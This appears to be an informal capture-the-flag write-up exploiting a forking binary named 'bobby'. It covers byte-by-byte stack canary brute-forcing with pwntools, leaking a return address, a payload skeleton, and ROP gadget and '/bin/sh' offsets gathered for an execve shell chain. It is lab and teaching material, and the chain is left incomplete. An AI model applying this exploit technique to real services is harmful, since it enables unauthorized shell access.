### Progressive finding
[1] We found that there is a parent process named bobby and that create a child process to handle user input also from /opt/override/boby.
[2] after inserting up to 72 byte the child crash and a python3 Apporter package process will be started to generate a report:

```sh
root        4864 90.9  1.6  47584 33068 ?        R    09:48   0:00 /usr/bin/python3 /usr/share/apport/apport -p3747 -s6 -c0 -d1 -P3747 -u1012 -g1014 -F -- !opt!override!bobby
```
of course we can't see that reports as we don't have privelige for it.
```sh
level00@override:~$ ls -la /var/crash/
total 36
drwxrwsrwt  2 root   root  4096 Jul 29 09:47 .
drwxr-xr-x 13 root   root  4096 Jun 10 11:59 ..
-rw-r-----  1 flag00 root 27197 Jul 29 09:47 _opt_override_bobby.1012.crash
```
and like that we did confirm that our child is crashing and we can start with our assumtions



### ASSUMPTION
[1] first we start by assuming that the crash is generated from a canary vayolation, theories  and the idea base is the following:
```
Send incrementally larger payloads until the process crashes or closes unexpectedly. The byte length right before the crash gives you the distance to the stack canary (or saved frame pointer/return address).
```
assuming that we are hitting a canary we will be bruforcing it byte by byte
```txt
Phase B: Byte-by-Byte Brute-Forcing (Canaries & Addresses)Because the stack canary stays constant across fork() calls, you can guess it one byte at a time:Send [Buffer] + [Byte 0]. If the application doesn't crash, Byte 0 is correct.Send [Buffer] + [Known Byte 0] + [Byte 1]. Repeat for all 256 possible values.On 64-bit systems, a canary is 8 bytes (with the first byte typically being \x00). Brute-forcing byte-by-byte requires at most $8 \times 256 = 2,048$ requests, rather than $2^{64}$.The same byte-by-byte approach applies to recovering the saved Frame Pointer (RBP/EBP) and Return Address (RIP/EIP).
```
let build a python script using pwntools to check for the first byte and see if we can avoid the crash.
after using our exploit i found that the stack canary values are the follwing:
```
level00@override:~$ python3 exploit.py 
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x27 (b"'")
[+] Process SURVIVED! First byte is: 0x28 (b'(')
[+] Process SURVIVED! First byte is: 0x35 (b'5')
[+] Process SURVIVED! First byte is: 0x11 (b'\x11')
[+] Process SURVIVED! First byte is: 0xf6 (b'\xf6')
[+] Process SURVIVED! First byte is: 0x20 (b' ')
[+] Process SURVIVED! First byte is: 0x9f (b'\x9f')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')

result: 0x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x410x00x270x280x350x110xf60x200x9f0x00x0
```
canary : [0x0,0x27,0x28,0x35,0x11,0xf6,0x20,0x9f]


extending our binary bruteforce byte leaking :
```
level00@override:~$ python3 exploit.py 
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x27 (b"'")
[+] Process SURVIVED! First byte is: 0x28 (b'(')
[+] Process SURVIVED! First byte is: 0x35 (b'5')
[+] Process SURVIVED! First byte is: 0x11 (b'\x11')
[+] Process SURVIVED! First byte is: 0xf6 (b'\xf6')
[+] Process SURVIVED! First byte is: 0x20 (b' ')
[+] Process SURVIVED! First byte is: 0x9f (b'\x9f')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x83 (b'\x83')
[+] Process SURVIVED! First byte is: 0x14 (b'\x14')
[+] Process SURVIVED! First byte is: 0x40 (b'@') \x40\x14\x83
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
[+] Process SURVIVED! First byte is: 0x0 (b'\x00')
```
That is the Saved Return Address (RIP): 0x401483!
This tells us two huge things:
    No PIE (Position Independent Executable): The binary is loaded at a fixed base address (0x400000 range). Code addresses in the binary will not randomize on restart!
    We know the exact function layout:
        Buffer: 72 bytes (b'A' * 72)
        Canary: 8 bytes (\x00\x27\x28\x35\x11\xf6\x20\x9f)
anyway after some testing we found our stack canary to be `\x00\x27\x28\x35\x11\xf6\x20\x9f` and after that we need to bypass 8 byte of the RBP and then we will be overwriting the RIP:

```
from pwn import *

canary = b"\x00\x27\x28\x35\x11\xf6\x20\x9f"
saved_rbp = b"B" * 8

# Address to jump to (e.g., shellcode on stack, PLT entry, or ROP gadget)
target_rip = [] // < our binary magics

payload = b"A" * 72 + canary + saved_rbp + target_rip
```

using ``ROPgadget --binary /opt/pwndbg/tests/binaries/host/glibcs/2.33/libc.so.6`` we will try to extract the following :

[1] find the ``pop rdi; ret`` address or anything like it : ``0x0000000000028a55 : pop rdi ; ret``
[2] find the address of ``/bin/sh`` :
```
level00@override:~$ strings -a -t x /opt/pwndbg/tests/binaries/host/glibcs/2.33/libc.so.6 | grep "/bin/sh"
1abf05 /bin/sh
```
or using:
```py
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 1. Find the static offset inside the file
bin_sh_offset = next(libc.search(b'/bin/sh'))
print(f"Static Offset: {hex(bin_sh_offset)}")

--------
# result 
```
level00@override:~$ python3 hmm.py 
[*] '/opt/pwndbg/tests/binaries/host/glibcs/2.33/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
Static Offset: 0x1abf05

[2] let get the ``pop rax; ret`` : ``0x0000000000044c70 : pop rax ; ret``
[3] syscall number of ``execv``our 59 : 0x3b
[4] let get the ``syscall; ret`` address (``alternative: 0x0000000000026858 : syscall``)

# 2. Resolved addresses from your offsets
pop_rdi = libc_base + 0x28a55
pop_rax = libc_base + 0x44c70
syscall = libc_base + 0x26858
bin_sh  = libc_base + 0x1abf05
